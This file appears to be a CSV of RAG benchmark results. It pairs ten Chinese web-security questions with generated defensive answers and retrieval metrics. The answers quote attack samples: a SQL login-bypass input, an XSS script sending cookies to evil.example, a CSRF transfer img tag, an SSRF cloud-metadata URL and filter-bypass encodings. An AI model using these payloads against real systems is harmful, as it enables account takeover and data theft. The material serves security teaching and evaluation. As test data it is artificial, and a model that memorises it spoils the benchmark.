taskId,taskName,mode,itemId,question,answer,retrievalTimeMs,generationTimeMs,totalTimeMs,promptTokens,completionTokens,retrievalHit,precisionAtK,recallAtK,ndcgAtK,mrr,keywordHitRate,citationMatched,route,rerankUsed,contextTokens,manualCorrectness,manualRelevance,manualCompleteness,manualHallucination,error
26,小到大-Chunk1024-KB6,RAG_LLM,1,什么是 SQL 注入?如何防御?,"# 什么是 SQL 注入?  ## 定义  SQL 注入(SQL Injection, CWE-89)是一种将恶意 SQL 语句插入应用程序查询参数, 从而欺骗后端数据库执行非预期命令的攻击方式。它长期位居 OWASP Top 10 漏洞列表前列, 可能导致**数据泄露、数据篡改、认证绕过甚至服务器接管** [1]。  ## 攻击原理  当应用程序将用户输入**直接拼接**进 SQL 语句时, 攻击者可以构造特殊输入改变语句逻辑 [1]。以登录场景为例:  ```sql -- 拼接式查询(危险) SELECT * FROM users WHERE username = '输入1' AND password = '输入2' ```  若攻击者在用户名处输入 `admin' --`, 拼接后的语句变为:  ```sql SELECT * FROM users WHERE username = 'admin' --' AND password = '...' ```  `--` 之后的内容被注释, **密码校验被完全绕过**。更严重的情况下, 攻击者可利用 `UNION SELECT` 读取任意表数据, 或利用数据库特性执行系统命令 [1]。  ## 常见攻击类型 [1]  | 类型 | 手法 | |---|---| | 基于布尔的盲注 | 通过页面返回差异逐位猜测数据 | | 基于时间的盲注 | 利用 `SLEEP()` 等函数根据响应时间推断数据 | | UNION 注入 | 利用 `UNION SELECT` 合并查询结果直接读取数据 | | 堆叠查询 | 分号后追加第二条语句(取决于数据库与驱动配置) |  ---  # 如何防御?  ## 1. 参数化查询(首选)  使用预编译语句, 用户输入只作为**数据绑定**, 不参与 SQL 语法解析 [1]:  ```java // Java JDBC String sql = ""SELECT * FROM users WHERE username = ? AND password = ?""; PreparedStatement ps = conn.prepareStatement(sql); ps.setString(1, username); ps.setString(2, password); ```  ## 2. 使用 ORM 框架 [1]  借助 ORM 框架的参数绑定机制, 避免手写拼接 SQL。  ## 3. 框架层面的具体实践(MyBatis)  - MyBatis 中**全部使用 `#{}`** 占位符, 禁止使用 `${}` 直接拼接 [3] - **动态排序字段无法参数化, 需用白名单映射**, 只允许预定义的列名 [3]  ## 防御核心思想总结  1. **数据与代码分离**: 用户输入只作为数据, 永远不参与 SQL 语法解析 [1] 2. **白名单兜底**: 对无法参数化的场景(如排序字段、表名), 使用服务端白名单校验 [3] 3. **多层防御**: 结合参数校验、统一错误响应(避免 500 堆栈泄露)等加固手段 [3]  ---  *以上内容均来自知识库片段 [1] 与 [3], 未涉及部分(如盲注工具使用、具体 WAF 配置)未在知识库中提供, 如需可另行补充通用安全常识。*",219,18798,19019,2343,913,1,0.2000,1.0000,1.0000,1.0000,0.7500,1,,0,1945,0,0,0,0
26,小到大-Chunk1024-KB6,RAG_LLM,2,MyBatis 中 #{} 和 ${} 的区别是什么?,"# MyBatis 中 `#{}` 与 `${}` 的区别  ## 一、核心区别  | 对比项 | `#{}` | `${}` | |---|---|---| | 处理方式 | 参数化绑定(占位符) | 字符串直接拼接 | | 是否预编译 | 是，输入只作为数据绑定，不参与 SQL 语法解析 [3] | 否，输入直接拼进 SQL 语句 [3] | | 安全性 | 安全，可防御 SQL 注入 [3] | 危险，存在 SQL 注入风险 [1] |  ## 二、原理说明  - **`#{}`**:使用预编译语句,占位符参数由数据库驱动以数据形式绑定，用户输入不会改变 SQL 语句的结构与逻辑 [3]。  - **`${}`**:将用户输入直接拼接进 SQL 语句，攻击者可以构造特殊输入改变语句逻辑。例如拼接式登录查询中，攻击者在用户名处输入 `admin' --`,密码校验即被 `--` 注释完全绕过 [3]。此外攻击者还可利用 `UNION SELECT` 读取任意表数据 [3]。  ## 三、代码示例  ```xml <!-- 正确: 参数化 --> <select id=""findUser"">SELECT * FROM users WHERE id = #{id}</select>  <!-- 危险: 字符串拼接, 存在注入风险 --> <select id=""bad"">SELECT * FROM users ORDER BY ${column}</select> ``` [1]  ## 四、防御实践  1. **严禁使用 `${}` 直接拼接**，MyBatis 全部使用 `#{}` [1][2]。  2. **动态排序字段等无法参数化的场景，使用白名单映射**，将外部传入的字段名映射到受控的数据库列名 [1][2]:  ```java private static final Map<String, String> ORDER_WHITE_LIST = Map.of(  ""createTime"", ""created_at"",  ""username"", ""username"" ); String column = ORDER_WHITE_LIST.getOrDefault(requestColumn, ""created_at""); ``` [1]  3. **配合输入校验**：对输入进行白名单校验(类型、长度、格式、字符集)，例如 ID 参数只允许数字 [1]。  4. **纵深防御**：可辅以最小权限原则(禁止应用账号使用 root 或 sa 权限)、错误信息脱敏、WAF 部署与定期代码审计 [1]。  ## 五、一句话总结  `#{}` 是参数化绑定，输入仅作为数据处理，是 MyBatis 中防 SQL 注入的首选方式 [1][3];`${}` 是字符串拼接，会直接改变 SQL 结构，除白名单映射的动态表名/列名场景外应一律禁止使用 [1][2]。",228,26556,26785,1782,1210,1,0.4000,1.0000,0.9197,1.0000,1.0000,1,,0,1463,0,0,0,0
26,小到大-Chunk1024-KB6,RAG_LLM,3,XSS 有哪几种类型?分别如何防御?,"# XSS 类型与防御方案  ## 一、XSS 的三种类型  根据知识库 [1]，跨站脚本攻击（Cross-Site Scripting, CWE-79）分为以下三类：  | 类型 | 特点 | 常见场景 | |------|------|----------| | **反射型 XSS** | 恶意脚本来自用户请求参数，服务器将其""反射""回响应页面 | 搜索结果页 [1] | | **存储型 XSS** | 恶意脚本被持久化存储到数据库，所有访问者都会执行 | 评论、个人简介等，**危害最大** [1] | | **DOM 型 XSS** | 由前端 JavaScript 不当操作 DOM 引起（如 `innerHTML` 写入未净化的 URL 参数），数据不经过服务器 | 纯前端渲染场景 [1] |  **攻击示例**（存储型）：评论功能未过滤输出，攻击者提交以下脚本，其他用户浏览评论页时会话 Cookie 被窃取发送至攻击者服务器 [1]：  ```html <script>fetch('https://evil.example/steal?c=' + document.cookie)</script> ```  ## 二、防御措施  ### 1. 输出编码（核心防御）[1]  根据输出上下文对数据进行编码，使注入内容被当作纯文本而非代码执行：  ```javascript // Vue 默认转义插值内容, 是安全的 <p>{{ userComment }}</p> // v-html 会渲染原始 HTML, 仅用于可信内容 <div v-html=""trustedHtml""></div> ```  ```java // Java 后端使用 OWASP Encoder Encode.forHtml(userInput); ```  ### 2. Content Security Policy (CSP) [1]  通过响应头限制页面可加载的资源，即使存在注入点，外部脚本也无法执行：  ``` Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none' ```  ### 3. HttpOnly Cookie [1]  设置 HttpOnly 后，JavaScript 无法通过 `document.cookie` 读取会话标识，即使 XSS 注入成功，也难以直接窃取会话 Cookie。  ### 4. 与 CSRF 防御的联动（补充）[2]  知识库特别指出一个重要关联：**XSS 通常可以用来绕过 CSRF Token 防御**（因为注入的脚本可以读取页面中的 Token），因此**修复 XSS 是 CSRF 防御的前置条件** [2]。同时，若采用纯 Token（如 JWT 存于 localStorage、通过 Authorization 头传递）方案，可天然免疫经典 CSRF，但 Token 一旦放入 Cookie，仍需结合 SameSite 与 CSRF Token 防御 [2]。  ## 三、防御要点小结  - **根本原则**：不信任任何用户输入，输出时按上下文编码 [1] - **纵深防御**：输出编码 + CSP + HttpOnly Cookie 组合使用，即使某一层失效仍有兜底 [1] - **优先级提示**：由于 XSS 可瓦解 CSRF Token 机制，XSS 修复应优先于其他依赖浏览器信任的防御措施 [2]",168,21572,21741,2267,973,1,0.2000,1.0000,1.0000,1.0000,1.0000,1,,0,1886,0,0,0,0
26,小到大-Chunk1024-KB6,RAG_LLM,4,CSRF 攻击的原理是什么?有哪些防御手段?,"# CSRF 攻击原理与防御手段  ## 一、什么是 CSRF  跨站请求伪造(Cross-Site Request Forgery, CWE-352)是指攻击者诱导已登录用户的浏览器, 在用户不知情的情况下向目标站点发送恶意请求。由于请求携带了用户的合法会话凭证(如 Cookie), 服务器难以区分这是否为用户本人意愿, 从而以用户身份执行了操作。[1]  ## 二、攻击原理  **典型场景**: 用户已登录 `bank.example`, 会话 Cookie 仍然有效。攻击者在第三方页面埋入:  ```html <img src=""https://bank.example/transfer?to=attacker&amount=10000""> ```  用户访问该页面时, 浏览器自动携带 Cookie 发起转账请求, 攻击完成。[1]  **攻击成立的三个关键条件**:  1. 受害者在目标站点持有有效会话; 2. 目标操作仅需 Cookie 即可认证, 无二次确认; 3. 攻击者能诱导受害者访问恶意页面。[1]  ## 三、防御手段  ### 1. CSRF Token(主流方案)  服务器为每个会话生成随机 Token, 嵌入表单或请求头; 请求到达时校验 Token 是否匹配。攻击者无法跨站读取该 Token, 伪造请求即告失败。[1]  ```html <form method=""post"" action=""/transfer"">   <input type=""hidden"" name=""_csrf"" value=""随机Token"">   ... </form> ```  > 补充: Spring Security 默认启用 CsrfFilter, 对非幂等请求(POST/PUT/DELETE)校验 `_csrf` 参数或 `X-CSRF-TOKEN` 头。[1]  ### 2. SameSite Cookie  现代浏览器支持 SameSite 属性, 限制 Cookie 在跨站请求中发送:[1]  ``` Set-Cookie: SESSIONID=xxx; SameSite=Lax; Secure; HttpOnly ```  - `Strict`: 完全不跨站发送; - `Lax`: 导航级 GET 请求允许携带(浏览器默认)。[1][2]  ### 3. 校验 Origin 与 Referer  对敏感请求检查 `Origin`/`Referer` 头是否为本站域名, 拒绝来源不明的跨站请求。[1][2]  ### 4. 避免 GET 产生副作用  严格遵守 HTTP 语义: 查询用 GET, 修改用 POST/PUT/DELETE, 从根源上杜绝 img/script 标签型 CSRF。[2]  ### 5. 二次认证  对转账、改密、删除等高危操作要求再次输入密码、验证码或动态口令。[2]  ## 四、补充要点(防御体系视角)  **CSRF 与 XSS 的关系**: CSRF 利用的是服务器对浏览器的信任, 攻击的是""用户身份""; 而 XSS 利用的是站点对输出的信任, 攻击的是""浏览器执行环境""。由于 XSS 脚本通常可以读取页面中的 CSRF Token 从而绕过该防御, **修复 XSS 是 CSRF 防御的前置条件**。[2]  **前后端分离项目的注意事项**: 纯 Token 方案(如 JWT 存于 localStorage 并通过 Authorization 头传递)天然免疫经典 CSRF, 因为跨站表单无法携带自定义头。但若将 Token 同时放入 Cookie, 则仍需结合 SameSite 与 CSRF Token 防御。[2]  ## 五、防御方案小结  | 防御手段 | 原理 | 适用建议 | |---------|------|---------| | CSRF Token | 攻击者无法跨站读取 Token | 主流方案, 优先采用 [1] | | SameSite Cookie | 限制 Cookie 跨站发送 | 浏览器层缓解, 建议默认开启 [1] | | Origin/Referer 校验 | 拒绝跨站来源请求 | 作为辅助手段 [1][2] | | 避免 GET 副作用 | 杜绝标签型伪造请求 | 编码规范层面根治 [2] | | 二次认证 | 高危操作二次确认 | 转账、改密等高危场景 [2] |  实际防护中建议**多层防御组合使用**: 以 CSRF Token 为核心, 配合 SameSite Cookie 与来源校验, 同时严格修复 XSS 漏洞, 并对高危操作增加二次认证。[1][2]",214,20482,20697,2120,1479,1,0.4000,1.0000,1.0000,1.0000,1.0000,1,,0,1765,0,0,0,0
26,小到大-Chunk1024-KB6,RAG_LLM,5,SSRF 是什么?云环境中最典型的危害是什么?,"## 一、SSRF 是什么  **SSRF(服务端请求伪造，Server-Side Request Forgery,CWE-918)** 是指攻击者诱使服务器端应用向攻击者指定的地址发起请求 [1]。  由于请求是由**内网服务器发出**的，攻击者可以借此实现多种攻击，常见场景包括 [1]:  1. **内网探测**：通过返回差异或超时时间推断内网主机与端口存活情况，例如请求 `http://192.168.1.1:8080/`; 2. **云元数据泄露**(详见下文)； 3. **协议滥用**：利用 `file://` 读取本地文件，利用 `gopher://`、`dict://` 等协议构造任意报文； 4. **绕过技巧**：使用十进制 IP(`2130706433` 代替 `127.0.0.1`)、短链接、DNS 重绑定、`0.0.0.0`、`[::1]` 等绕过基于字符串的黑名单校验 [1]。  该漏洞常见于**网页截图、URL 预览、图片转存、Webhook 回调、导入远程文件**等功能 [1]。OWASP Top 10 2021 将其列为 **A10:2021** [2],OWASP API 安全 Top 10 亦设有 **API7: SSRF** 条目 [3]。  ## 二、云环境中最典型的危害  在云环境中，最典型的危害是**云元数据泄露**：  > 攻击者通过 SSRF 请求云平台元数据服务 `http://169.254.169.254/latest/meta-data/`,**获取实例凭证(临时访问密钥)，进而接管云资源** [1]。  由于元数据服务只能从实例内部访问，而 SSRF 恰好提供了“借服务器之手”发起内网请求的能力，攻击者无需进入主机即可窃取凭证、横向控制云上资源，这是云环境下 SSRF 危害被显著放大的核心原因 [1]。  ## 三、简要防御建议  面向学习与防御场景，核心防御思路如下 [1][3]:  1. **白名单校验目标地址(首选)**：只允许请求预定义或显式授权的域名/IP 段 [1]; 2. **禁用危险协议**：如 `file://`、`gopher://`、`dict://` 等 [1]; 3. **解析后校验 IP**:避免仅凭字符串黑名单，需在 DNS 解析后校验最终 IP,防止重绑定绕过 [3]; 4. **网络隔离**：限制服务器可访问的内网范围，并对元数据服务做访问加固 [3]。",167,22066,22234,2348,1043,1,0.2000,1.0000,1.0000,1.0000,0.8000,1,,0,1914,0,0,0,0
26,小到大-Chunk1024-KB6,RAG_LLM,6,JWT 常见的安全风险有哪些?,"# JWT 常见安全风险  根据知识库内容，JWT 主要存在以下五类安全风险：  ## 1. 算法混淆攻击  服务端若信任 Header 中声明的算法，攻击者可以进行两种篡改 [1]：  - 将 `alg` 改为 `none`,绕过签名验证 - 将 RS256 篡改为 HS256(用公钥当 HMAC 密钥)，伪造合法签名  **防御要点**：服务端硬编码固定算法，不从 Token 中读取算法声明 [1]。  ## 2. 密钥强度不足与硬编码  - **弱密钥**(如 `secret`、`123456`)可被暴力破解 - **硬编码**在源码中的密钥一旦泄露即全面失守 [1]  **防御要点**：密钥仅通过环境变量或密钥管理服务注入，长度不低于 256 位 [1];使用强随机密钥(≥32 字节)，不入库、不入代码仓库 [3]。  ## 3. 敏感信息泄露  Payload 仅做 Base64 编码，**明文可读**，任何人拿到 Token 即可解码查看内容。因此严禁在 Payload 中存放密码、手机号等敏感数据，只应放置必要声明(userId、role、iat、exp)[1][3]。  ## 4. Token 无法主动失效  JWT 是无状态的，签发后在过期前**始终有效**。当用户改密、注销或账号被盗时，缺乏失效机制会导致旧 Token 仍然可用 [1]。  **防御要点** [1]：  - 引入服务端黑名单(如 Redis) - 缩短有效期并配合刷新令牌 - 在签名中加入版本号，随密钥变更使旧 Token 失效  ## 5. 存储位置风险  不同的 Token 存储位置各有短板 [1][3]：  | 存储位置 | 主要风险 | 配套防御 | |---------|---------|---------| | localStorage | 易受 XSS 攻击窃取 | 需配套严格的 XSS 防御 | | HttpOnly Cookie | 天然防 XSS 窃取 | 需配套 CSRF 防御 |  ## 补充：安全实践建议  结合知识库的实践清单，建议同步落实以下措施以对冲上述风险 [3]:  1. 固定签名算法为 HS256/RS256,服务端显式指定 2. 设置短有效期(如 2 小时)并校验 `exp`/`nbf` 3. 每次请求均验证签名与有效期，解析失败统一返回 401,不区分具体错误原因 4. 注销/改密时使 Token 失效(黑名单或版本号) 5. 传输全程使用 HTTPS 6. 日志中不得打印完整 Token  **总结**：JWT 的风险核心在于“算法信任、密钥管理、明文编码、无状态失效、存储方式”五个环节，任何一个环节处理不当都可能导致身份伪造或凭证泄露 [1]。",192,13114,13307,2550,838,1,0.4000,1.0000,0.9197,1.0000,0.8000,1,,0,2118,0,0,0,0
26,小到大-Chunk1024-KB6,RAG_LLM,7,文件上传功能有哪些安全风险?如何防范?,"# 文件上传功能的安全风险与防范  ## 一、主要安全风险  文件上传功能是 Web 攻击的高发入口，主要风险包括 [1]：  1. **WebShell 上传**：攻击者上传可执行脚本(如 `shell.jsp`、`shell.php`),直接获得服务器控制权 [1]。 2. **目录穿越**：利用 `../../` 等路径序列将文件写到任意路径，覆盖关键配置文件 [1]。其原理是利用 `../` 序列逃逸受限目录，读取或覆盖任意文件(CWE-22),常见绕过手法还包括编码变形(`%2e%2e%2f`、`..%c0%af`)与绝对路径注入 [3]。 3. **存储型 XSS**:上传含脚本的 HTML/SVG 文件，被浏览器直接渲染后触发脚本执行 [1]。 4. **拒绝服务(DoS)**:上传超大文件或畸形压缩包，耗尽服务器磁盘与内存资源 [1]。 5. **恶意文件分发**：服务器被攻击者当作恶意文件中转站使用 [1]。  ## 二、防御措施  ### 1. 严格校验文件类型(白名单) [1]  - 校验**扩展名白名单**(如仅允许 pdf、txt、md、docx),拒绝一切可执行扩展名 [1]; - 校验**文件头**防止仅改扩展名绕过；但需注意文件头伪造风险，白名单 + 头校验需配合使用 [1]; - 使用**成熟解析库**读取内容，拒绝解析失败或内容异常的文件 [1]。  ### 2. 重命名存储 [1]  使用服务端生成的随机文件名(如 UUID)存储，保留原始文件名仅作为展示元数据，彻底消除特殊文件名、路径穿越与解析漏洞 [1]:  ```java String ext = FilenameUtils.getExtension(originalName).toLowerCase(); if (!ALLOWED_EXTENSIONS.contains(ext)) {     throw new BusinessException(""不支持的文件类型""); } Path target = uploadRoot.resolve(UUID.randomUUID() + ""."" + ext); // 二次确认: 规范化后必须仍位于上传根目录内 if (!target.normalize().startsWith(uploadRoot)) {     throw new BusinessException(""非法文件路径""); } ```  ### 3. 路径穿越专项防御 [3]  - **规范化后校验前缀**(核心手段)：将基目录与用户输入拼接后规范化，确认目标路径仍位于基目录内 [3]:  ```java Path base = Paths.get(uploadRoot).normalize().toAbsolutePath(); Path target = base.resolve(userInput).normalize().toAbsolutePath(); if (!target.startsWith(base)) {     throw new BusinessException(""非法路径""); } ```  - 文件名使用 `Path.getFileName()` 或直接由服务端生成随机名，不接受用户提供的路径 [3]; - 白名单校验文件名字符集(仅字母数字与少量安全符号)[3]; - 运行账号遵循最小权限，限制可访问目录 [3]; - Web 服务器层拒绝包含 `..` 的请求，形成多层防御 [3]。  ### 4. 限制文件大小 [1][4]  - 应用层限制单文件大小(如 50MB)[1][4]; - Web 服务器层限制请求体大小(nginx `client_max_body_size`)[1][4]; - 上传频率与配额限制，防止滥用 [1][4]。  ### 5. 隔离存储 [1][4]  - 上传目录**不赋予执行权限** [4]; - 静态资源通过单独域名/CDN 提供，与应用域隔离 [4]; - 下载时设置 `Content-Disposition: attachment` 与正确的 `Content-Type`,防止浏览器内联渲染触发 XSS [4]。  ### 6. 内容检测 [4]  - 对文档进行病毒扫描； - 对图片重新编码，消解隐写与内嵌脚本； - 对 PDF/Office 文档解析失败即拒绝 [4]。  ### 7. 纵深防御原则 [5]  以上措施应分层叠加，体现“**永不信任输入**”(所有外部数据进入解释型上下文前必须校验或编码)与“**纵深防御**”(校验分层进行，单层失效不致整体失守)的通用安全编码原则 [5]。同时遵循“**失败安全**”：异常时进入安全状态(拒绝服务请求而非跳过校验)[5]。  ## 三、补充：知识库问答(RAG)场景下的特殊要求 [4]  若上传的文档进入“解析 → 清洗 → 分块 → 向量化”流水线，还需注意 [4]:  1. 白名单限制为可解析的文档类型(PDF/TXT/MD/DOCX)[4]; 2. 解析失败时标记文档状态为 FAILED 并记录原因，不中断服务 [4]; 3. 文件内容仅用于向量化检索，原文件不直接暴露下载 URL,需要时经鉴权接口返回 [4]。  ## 总结  文件上传安全的核心思路是：**白名单校验类型 → 服务端随机重命名 → 规范化后校验路径前缀 → 限制大小 → 隔离存储且不赋予执行权限 → 内容检测**，多层措施配合形成纵深防御 [1][3][4][5]。",221,23341,23563,2200,1612,1,0.4000,1.0000,0.8772,1.0000,0.7500,1,,0,1742,0,0,0,0
26,小到大-Chunk1024-KB6,RAG_LLM,8,BOLA 和 BFLA 的区别是什么?,"# BOLA 与 BFLA 的区别  BOLA 和 BFLA 都是“只做了认证(验证你是谁)、但没做授权(验证你能做什么)”导致的越权漏洞，均属于 OWASP API Security Top 10 关注的核心问题 [1][2]。两者的核心区别在于**越权方向不同**：  ## 核心区别  | 维度 | BOLA(对象级授权失效) | BFLA(功能级授权失效) | |------|----------------------|----------------------| | 越权类型 | **横向越权** | **纵向越权** | | 缺失校验 | 不验证""这个对象是不是你的"" | 不验证""你是否有权调用这个功能"" | | 典型场景 | A 用户访问 B 用户的资源 | 普通用户调用管理接口 | | 攻击对象 | 数据对象的归属关系 | 功能的访问权限(角色) |  ## BOLA:对象级授权失效  **漏洞本质**：API 只验证“你是谁""(认证),不验证“这个对象是不是你的""(授权),导致横向越权 [2]:  ``` GET /api/invoices/5001 # A 用户查看自己的发票 → 200 GET /api/invoices/5002 # A 用户查看 B 用户的发票 → 若无归属校验, 同样 200 ```  BOLA 是 OWASP API Security Top 10 之首，也是数据泄露事件的最主要根因 [2]。  **高发场景** [2]: 1. 自增整数主键暴露，易于遍历(5001 → 5002 → ...) 2. UUID 被误认为“不可猜测即安全”(一旦泄露仍可越权) 3. 批量接口、导出接口、子资源路径(`/users/{id}/orders`)遗漏校验 4. 导航/回退接口复用了宽权限查询  ## BFLA:功能级授权失效  **漏洞本质**：接口只做认证不做角色校验，普通用户可调用管理功能，造成纵向越权 [2]:  ``` POST /api/admin/users/42/disable # 普通用户调用管理接口 ```  **常见根因** [2]: - 前端隐藏按钮但后端无校验 - 管理接口与普通接口混在同一 Controller - 注解遗漏  ## 防御方案  **BOLA 防御**——每次数据访问都把“归属”写进查询条件 [2]:  ```java // MyBatis-Plus: 查询条件强制带归属 Invoice invoice = invoiceMapper.selectOne(     Wrappers.<Invoice>lambdaQuery()         .eq(Invoice::getId, invoiceId)         .eq(Invoice::getUserId, currentUserId)); // 关键行 if (invoice == null) {     throw new BusinessException(404, ""发票不存在""); // 统一 404, 不区分""无权/不存在"" } ```  > 注意：服务端返回 404 而非 403,避免攻击者借此确认对象存在性 [2]。  **BFLA 防御**——逐接口显式声明权限，通过拦截器统一执行 [2]。同时遵循“默认拒绝”原则，逐对象、逐功能校验授权 [1]。  **工程落地**：在代码评审时，应检查新接口是否同时做了认证与授权(BOLA/BFLA)[5],并建议通过网关统一鉴权、遵循授权“默认拒绝”原则 [1]。  ## 一句话总结  - **BOLA 问的是：“这个数据是你的吗？""——防横向越权** - **BFLA 问的是：“你有权执行这个功能吗？""——防纵向越权**",170,19959,20130,2146,1183,1,0.2000,1.0000,0.6309,0.5000,1.0000,1,,0,1669,0,0,0,0
26,小到大-Chunk1024-KB6,RAG_LLM,9,为什么不能使用 MD5 存储密码?应该用什么?,"# 为什么不能用 MD5 存储密码？  ## 一、MD5 的核心问题  ### 1. 它是“快速哈希”，为速度而设计 MD5/SHA1 属于快速哈希算法，计算速度极快，而密码存储恰恰需要“慢”。攻击者拿到哈希库后，可以利用 GPU 每秒计算数十亿次哈希进行暴力破解，MD5/SHA1 存储的密码极易被破解，被知识库明确列为**危险方案** [2]。  ### 2. 彩虹表攻击极易得手 由于 MD5 计算快且无随机性(相同密码哈希结果相同)，攻击者可预先生成海量“密码 → 哈希”对照表(彩虹表)，直接反查明文 [2]。  ### 3. “加盐 MD5”也不够安全 有人认为加盐能解决问题，但知识库指出**加盐 MD5 仍属“不足”方案**： - 盐通常与哈希值存在同一数据库中，**拖库时盐会被一同获取**； - 即使有了盐，MD5 本身计算速度依然快，GPU 每秒仍可算数十亿次，暴力破解成本依旧很低 [2]。  > 补充说明(通用知识，无知识库引用)：MD5 还存在密码学层面的碰撞缺陷，作为通用哈希函数早已不安全，但密码存储场景的核心问题在于“太快、可穷举”。  ---  ## 二、应该用什么？——自适应慢哈希 + 盐  知识库推荐方案：**PBKDF2 / BCrypt / Argon2** [2],这类算法是自适应慢哈希并自带盐，破解成本可随硬件升级而调高 [2][3]。  ### 1. 以 BCrypt 为例的三大优势 [2]  | 特性 | 说明 | |------|------| | **自带随机盐** | 相同密码每次哈希结果不同，天然抗彩虹表 | | **成本因子可调** | 哈希轮数为 2^cost,可随硬件进步调大，持续保持破解成本 | | **输出自包含** | 如 `$2a$10$N9qo8uLOickgx2ZMRZoMye...`,内含算法版本、成本因子、盐与哈希值，校验时直接解析，**无需单独存盐** |  **推荐成本因子：10-12**(单次哈希约 60-250ms),既保证安全又兼顾登录体验 [2]。  ### 2. Spring Boot 中的实践 [5]  使用 `BCryptPasswordEncoder`(默认强度 10),禁止 MD5/SHA1 及明文方案：  ```java @Bean public PasswordEncoder passwordEncoder() {     return new BCryptPasswordEncoder(); // 默认强度 10 }  // 注册 String hash = passwordEncoder.encode(rawPassword);  // 登录校验 boolean ok = passwordEncoder.matches(rawPassword, storedHash); ```  ---  ## 三、配套安全建议  - 密码哈希仅是基础，还需配合：防用户枚举(登录失败统一提示“用户名或密码错误”)、防爆破(失败计数 + 锁定/验证码/限流)、全程 HTTPS 传输 [2] - 会话凭证管理：密码、Token 不写日志、不进前端持久化；注销/改密后使既有凭证失效 [2][3] - 弱密码治理：长度 ≥ 8 并检查常见弱密码字典，建议使用密码短语或密码管理器 [2]  ---  **总结**:MD5 因“计算过快 + 无随机性，易遭彩虹表与暴力破解”，加盐后仍不安全 [2],应改用 BCrypt/Argon2/PBKDF2 等自适应慢哈希算法，并推荐 BCrypt 成本因子设为 10-12 [2][3][5]。",204,23625,23830,2258,1367,1,0.2000,1.0000,0.6309,0.5000,1.0000,1,,0,1703,0,0,0,0
26,小到大-Chunk1024-KB6,RAG_LLM,10,RAG 系统的完整流程是什么?,"# RAG 系统的完整流程  RAG(Retrieval-Augmented Generation, 检索增强生成)采用“先检索、后生成”的两阶段架构增强大语言模型：用户提问后，系统先从外部知识库检索相关内容，再将其作为上下文交给 LLM 生成回答，以缓解 LLM 的知识截止、幻觉、私域知识缺失三大缺陷 [1]。  完整流程分为**离线索引阶段**和**在线问答阶段**两部分 [1]:  ## 一、离线索引阶段  1. **文档解析**： 提取 PDF/TXT/MD/DOCX 等文档的文本内容 [1] 2. **清洗**： 去除控制字符、页眉页脚、乱码等噪声 [1] 3. **分块**： 按语义边界与固定长度切分为 chunk, 通常 256-1024 字符， 相邻块保留重叠以保持语义连贯 [1] 4. **向量化**： 使用 Embedding 模型将每个 chunk 映射为稠密向量 [1] 5. **入库**： 向量与原文、元数据(文档名、页码、块序号)一同存入向量数据库 [1]  ## 二、在线问答阶段  1. **查询预处理**： 去噪、关键信息抽取、多轮对话改写 [1] 2. **查询向量化**： 使用同一 Embedding 模型编码用户问题 [1] 3. **检索**： 向量数据库按余弦相似度返回 Top-K 最相关 chunk [1] 4. **重排序**(可选)： 用 CrossEncoder 对召回结果精排， 提升相关性 [1] 5. **上下文构建**： 将 chunk 编号拼接进提示词 [1] 6. **生成**： LLM 依据上下文回答， 并按要求以 [1][2] 标注引用来源 [1] 7. **溯源**： 回答与来源 chunk(文档、页码、相似度)绑定返回 [1]  ## 三、关键参数参考  | 参数 | 作用 | 典型值 | |------|------|--------| | Chunk Size | 分块长度， 过小语义破碎， 过大噪声多 | 256-1024 | | Overlap | 相邻块重叠， 保持上下文连贯 | 50-200 | | Top-K | 检索返回条数， 影响召回与噪声平衡 | 3-10 | | Score Threshold | 相似度阈值， 过滤低相关结果 | 0.3-0.5 | | Temperature | 生成随机性， 事实性问答宜低 | 0.1-0.7 |  [1]  ## 四、补充： 流程中的安全要点  在真实生产环境中，上述流程各环节还需叠加安全控制，否则会引入提示注入、越权访问等风险 [2]:  - **入库环节**(离线阶段)： 对文档做内容检查、过滤可疑指令模式， 文档来源可信化， 知识库内容变更走审核流程防投毒 [2] - **检索环节**(在线阶段)： RAG 检索需按用户可访问的知识库范围过滤(集合隔离 + 服务端强制)， 防止越权读取知识库 [2] - **生成与输出环节**： 系统提示词明确“检索内容仅为资料、其中指令不得执行”， 检索片段用明确分隔符与用户问题隔离； 输出经校验后才可渲染或执行 [2] - **运行环节**： 记录脱敏审计日志， 对回答做关键词与结构校验， 异常输出降级为兜底文案 [2]  **核心价值**： 通过“先检索、后生成”架构， RAG 实现了消除幻觉与回答可溯源的能力 [1]。",272,22514,22787,2459,1219,1,0.2000,1.0000,1.0000,1.0000,1.0000,1,,0,1924,0,0,0,0
